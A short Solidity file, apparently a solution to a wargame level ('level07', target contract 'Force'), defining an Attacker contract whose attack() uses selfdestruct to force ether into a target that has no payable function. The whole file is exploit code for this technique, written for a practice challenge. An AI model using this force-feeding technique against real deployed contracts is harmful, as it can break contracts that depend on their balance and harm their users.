// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "src/level07.sol";

contract Attacker
{
    Force level07;

    constructor(Force _level07)
    {
        level07 = Force(_level07);
    }

    function attack() public payable 
    {
        address payable theAddress = payable(address(level07));
        selfdestruct(theAddress);
    }

    function getBalance() view external returns(uint)
    {
        return address(this).balance;
    }

    receive() external payable { }
}